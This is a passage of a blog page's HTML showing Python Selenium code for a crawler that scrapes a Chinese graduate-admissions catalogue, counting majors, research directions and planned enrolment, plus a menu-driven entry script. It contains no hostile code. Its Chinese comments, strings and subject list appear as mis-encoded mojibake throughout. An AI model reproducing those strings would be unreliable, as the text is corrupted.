class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(</span><br><span class=\"line\">                                <span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                            numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                            print(<span class=\"string\">\"  æ‹Ÿæ‹›ç”Ÿï¼š\"</span> + numbers)</span><br><span class=\"line\">                            all_number += int(numbers)</span><br><span class=\"line\">                        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                            print(e)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        print(e)</span><br><span class=\"line\">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ä¸‹ä¸€é¡µæŒ‰é’®ä½ç½®ä¸åŒ,ç”¨ Go</span></span><br><span class=\"line\">            flag = <span class=\"number\">2</span>  <span class=\"comment\"># ä¸‹ä¸€æ¬¡è¦Goçš„é¡µç </span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\">                driver.find_element_by_css_selector(<span class=\"string\">\"#goPageNo\"</span>).send_keys(str(flag))  <span class=\"comment\"># è¾“å…¥é¡µç è·³è½¬</span></span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='page-btn']\"</span>).click()  <span class=\"comment\"># ç‚¹å‡» Goï¼Œä»ç„¶åŒæ˜¯ä¸€ä¸ª window_handle</span></span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">                flag +=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># print(len(major_list))</span></span><br><span class=\"line\">        print(<span class=\"string\">\"ä¸“ä¸šæ•°é‡ï¼š \"</span> + str(majors))</span><br><span class=\"line\">        print(<span class=\"string\">\"  å…±æ‹›ç”Ÿ: \"</span> + str(all_number))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> majors, all_number</span><br></pre></td></tr></table></figure>\n\n<p><code>RDsBySchoolName</code> ä¸»è¦è´Ÿè´£åŠŸèƒ½ä¸‰ï¼Œä¸»è¦ä»£ç ä¸ºï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_major_list</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        major_number_list = []</span><br><span class=\"line\">        admission_list = []</span><br><span class=\"line\">        label_list = []</span><br><span class=\"line\">        value_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">        ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='zsml-zy-filter']\"</span>)</span><br><span class=\"line\">        li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"å½“å‰é™¢æ ¡ä¸“ä¸šæ•°é‡ï¼š\"</span> + str(len(li)))</span><br><span class=\"line\"></span><br><span class=\"line\">        input_selector = <span class=\"string\">\"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/input[1]\"</span></span><br><span class=\"line\">        label_selector = <span class=\"string\">\"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/label[1]\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> check_box <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(li)+<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                value = driver.find_element_by_xpath(input_selector.format(check_box)).get_attribute(<span class=\"string\">\"value\"</span>)</span><br><span class=\"line\">                label = driver.find_element_by_xpath(label_selector.format(check_box)).get_attribute(<span class=\"string\">\"textContent\"</span>)</span><br><span class=\"line\">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='blue-btn-s']\"</span>).click()</span><br><span class=\"line\">                label_list.append(label)</span><br><span class=\"line\">                value_list.append(value)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># å¾—åˆ°æ¯ä¸ªä¸“ä¸šä¸‹çš„ç ”ç©¶æ–¹å‘æ•°é‡ä¸æ‹Ÿæ‹›ç”Ÿäººæ•°</span></span><br><span class=\"line\">                majors, all_number = self.get_major_info(driver)</span><br><span class=\"line\">                major_number_list.append(majors)</span><br><span class=\"line\">                admission_list.append(all_number)</span><br><span class=\"line\"></span><br><span class=\"line\">                print(<span class=\"string\">\" å½“å‰ä¸“ä¸šï¼š\"</span> + label)</span><br><span class=\"line\">                print(<span class=\"string\">\" ç ”ç©¶æ–¹å‘æ•°é‡ï¼š \"</span> + str(majors), <span class=\"string\">\"æ‹Ÿæ‹›ç”Ÿäººæ•°ï¼š \"</span> + str(all_number))</span><br><span class=\"line\">                <span class=\"comment\"># ä¸¤æ¬¡ç‚¹å‡»å–æ¶ˆé€‰æ‹©</span></span><br><span class=\"line\">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='blue-btn-s']\"</span>).click()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                print(e)</span><br><span class=\"line\">        print(value_list, label_list)</span><br><span class=\"line\">        print(major_number_list, admission_list)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> label_list, major_number_list, admission_list</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å¾—åˆ°ç ”ç©¶æ–¹å‘æ•°é‡ä¸æ‹Ÿæ‹›ç”Ÿäººæ•°</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_major_info</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># å½“å‰ Tab é‡Œæœ‰å¤šå°‘ä¸ªé¡µé¢</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        majors = <span class=\"number\">0</span></span><br><span class=\"line\">        all_number = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># å®šä½è·³è½¬</span></span><br><span class=\"line\">        css_selector_jumpto = <span class=\"string\">\"body.ch-sticky:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.main-wrapper:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.container.clearfix:nth-child(5) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-row.clearfix \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-page-box ul.ch-page \"</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"comment\"># ä¸ç”¨ä¸‹ä¸€é¡µæ“ä½œ</span></span><br><span class=\"line\">            major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">            majors += len(major)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(<span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                    numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                    all_number += int(numbers)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°ä¸‹ä¸€é¡µæŒ‰é’®</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    <span class=\"comment\"># print(\"è¿™ä¸€é¡µçš„ç ”ç©¶æ–¹å‘æ•°é‡\" + str(len(major)))</span></span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                            number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(</span><br><span class=\"line\">                                <span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                            numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                            <span class=\"comment\"># print(\"  æ‹Ÿæ‹›ç”Ÿï¼š\" + numbers)</span></span><br><span class=\"line\">                            all_number += int(numbers)</span><br><span class=\"line\">                        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                            print(e)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> majors, all_number</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"å®Œæ•´ä»£ç \"><a href=\"#å®Œæ•´ä»£ç \" class=\"headerlink\" title=\"å®Œæ•´ä»£ç \"></a>å®Œæ•´ä»£ç </h2><p><strong>CSCrawler.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding: utf-8</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">@author: Brian</span></span><br><span class=\"line\"><span class=\"string\">@file: CSCrawler.py</span></span><br><span class=\"line\"><span class=\"string\">@time: 2020/6/30 14:42</span></span><br><span class=\"line\"><span class=\"string\">@desc: ç¨‹åºçš„ä¸»å…¥å£å‡½æ•°</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> SchoolMapByPyEcharts <span class=\"keyword\">import</span> SchoolMap</span><br><span class=\"line\"><span class=\"keyword\">from</span> ResearchDirectionsByPyEcharts <span class=\"keyword\">import</span> ReserachDirections</span><br><span class=\"line\"><span class=\"keyword\">from</span> RDsBySchoolName <span class=\"keyword\">import</span> RDsBySchoolName</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CSCrawler</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, url, yjxkdm)</span>:</span></span><br><span class=\"line\">        self.url = url</span><br><span class=\"line\">        self.yjxkdm = yjxkdm</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">SchoolMap</span><span class=\"params\">(self, mldm)</span>:</span></span><br><span class=\"line\">        school_map = SchoolMap(self.url, mldm, self.yjxkdm)</span><br><span class=\"line\">        driver = school_map.set_driver()</span><br><span class=\"line\">        city_name, school_counts = school_map.select_major(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">        school_map.visulize(city_name, school_counts)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ResearchDirection</span><span class=\"params\">(self, count, mldm)</span>:</span></span><br><span class=\"line\">        researdirection = ReserachDirections(self.url, count, mldm, self.yjxkdm)</span><br><span class=\"line\">        driver = researdirection.set_driver()</span><br><span class=\"line\"></span><br><span class=\"line\">        x, y1, y2, flag = researdirection.select_option(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">        researdirection.stacked_area_chart(x, y1, y2, flag)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">RDsBySchoolName</span><span class=\"params\">(self, schoolname)</span>:</span></span><br><span class=\"line\">        rds = RDsBySchoolName(self.url, schoolname, self.yjxkdm)</span><br><span class=\"line\">        driver = rds.set_driver()</span><br><span class=\"line\">        x, y1, y2, flag = rds.select_school(driver)</span><br><span class=\"line\">        rds.stacked_area_chart(x, y1, y2, flag)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">\"\"</span></span><br><span class=\"line\">          <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">          -------æ¬¢è¿æ¥åˆ°ç ”æ‹›ç½‘ä¸“ä¸šç›®å½•ä¿¡æ¯çˆ¬è™«é¡¹ç›®-------</span></span><br><span class=\"line\"><span class=\"string\">                        ä½ æƒ³åšä»€ä¹ˆ?</span></span><br><span class=\"line\"><span class=\"string\">                [1]: ç›®æ ‡ä¸“ä¸šçš„å…¨å›½åˆ†å¸ƒåœ°å›¾</span></span><br><span class=\"line\"><span class=\"string\">                [2]: ç›®æ ‡çœä»½å†…ä¸ªé«˜æ ¡å¯¹ç›¸å…³ä¸“ä¸šçš„æ‹›æ”¶æƒ…å†µ</span></span><br><span class=\"line\"><span class=\"string\">                [3]: ç›®æ ‡é™¢æ ¡å¯¹åº”ä¸“ä¸šçš„ç ”ç©¶æ–¹å‘ä¸æ‹Ÿæ‹›ç”Ÿäººæ•°æƒ…å†µ</span></span><br><span class=\"line\"><span class=\"string\">                [4]: é€€å‡ºç¨‹åº</span></span><br><span class=\"line\"><span class=\"string\">          -----------è¯·åœ¨ä¸‹æ–¹è¾“å…¥ç›¸å…³æ“ä½œä»£ç ------------</span></span><br><span class=\"line\"><span class=\"string\">          \"\"\"</span></span><br><span class=\"line\">          <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">    flag = <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(flag):</span><br><span class=\"line\">        code = input(<span class=\"string\">\"è¯·è¾“å…¥æ“ä½œä»£ç ï¼š\"</span>).strip()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(code == str(<span class=\"number\">1</span>)):</span><br><span class=\"line\">            print(<span class=\"string\">\"æ­£åœ¨åŠ è½½ç›®æ ‡ä¸“ä¸šçš„å…¨å›½åˆ†å¸ƒåœ°å›¾çš„ç¨‹åº...\"</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">                  <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">            é—¨ç±»ç±»åˆ«ï¼š</span></span><br><span class=\"line\"><span class=\"string\">                ä¸“ä¸šå­¦ä½ï¼š</span></span><br><span class=\"line\"><span class=\"string\">                (zyxw)ä¸“ä¸šå­¦ä½</span></span><br><span class=\"line\"><span class=\"string\">                ['(0251)é‡‘è', '(0252)åº”ç”¨ç»Ÿè®¡', '(0253)ç¨åŠ¡', '(0254)å›½é™…å•†åŠ¡', '(0255)ä¿é™©', '(0256)èµ„äº§è¯„ä¼°',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0257)å®¡è®¡', '(0351)æ³•å¾‹', '(0352)ç¤¾ä¼šå·¥ä½œ', '(0353)è­¦åŠ¡', '(0451)æ•™è‚²', '(0452)ä½“è‚²',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0453)æ±‰è¯­å›½é™…æ•™è‚²', '(0454)åº”ç”¨å¿ƒç†', '(0551)ç¿»è¯‘', '(0552)æ–°é—»ä¸ä¼ æ’­', '(0553)å‡ºç‰ˆ',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0651)æ–‡ç‰©ä¸åšç‰©é¦†', '(0851)å»ºç­‘å­¦', '(0853)åŸå¸‚è§„åˆ’', '(0854)ç”µå­ä¿¡æ¯', '(0855)æœºæ¢°',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0856)ææ–™ä¸åŒ–å·¥', '(0857)èµ„æºä¸ç¯å¢ƒ', '(0858)èƒ½æºåŠ¨åŠ›', '(0859)åœŸæœ¨æ°´åˆ©', '(0860)ç”Ÿç‰©ä¸åŒ»è¯',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0861)äº¤é€šè¿è¾“', '(0951)å†œä¸š', '(0952)å…½åŒ»', '(0953)é£æ™¯å›­æ—', '(0954)æ—ä¸š', '(1051)ä¸´åºŠåŒ»å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                          '(1052)å£è…”åŒ»å­¦', '(1053)å…¬å…±å«ç”Ÿ', '(1054)æŠ¤ç†', '(1055)è¯å­¦', '(1056)ä¸­è¯å­¦', '(1057)ä¸­åŒ»',</span></span><br><span class=\"line\"><span class=\"string\">                          '(1151)å†›äº‹', '(1251)å·¥å•†ç®¡ç†', '(1252)å…¬å…±ç®¡ç†', '(1253)ä¼šè®¡', '(1254)æ—…æ¸¸ç®¡ç†', '(1255)å›¾ä¹¦æƒ…æŠ¥',</span></span><br><span class=\"line\"><span class=\"string\">                          '(1256)å·¥ç¨‹ç®¡ç†', '(1351)è‰ºæœ¯']</span></span><br><span class=\"line\"><span class=\"string\">                å­¦æœ¯å­¦ä½ï¼š</span></span><br><span class=\"line\"><span class=\"string\">                (01)å“²å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0101)å“²å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (02)ç»æµå­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0201)ç†è®ºç»æµå­¦', '(0202)åº”ç”¨ç»æµå­¦', '(0270)ç»Ÿè®¡å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (03)æ³•å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0301)æ³•å­¦', '(0302)æ”¿æ²»å­¦', '(0303)ç¤¾ä¼šå­¦', '(0304)æ°‘æ—å­¦', '(0305)é©¬å…‹æ€ä¸»ä¹‰ç†è®º', '(0306)å…¬å®‰å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (04)æ•™è‚²å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0401)æ•™è‚²å­¦', '(0402)å¿ƒç†å­¦', '(0403)ä½“è‚²å­¦', '(0471)']</span></span><br><span class=\"line\"><span class=\"string\">                (05)æ–‡å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0501)ä¸­å›½è¯­è¨€æ–‡å­¦', '(0502)å¤–å›½è¯­è¨€æ–‡å­¦', '(0503)æ–°é—»ä¼ æ’­å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (06)å†å²å­¦</span></span><br><span class=\"line\"><span class=\"string\">                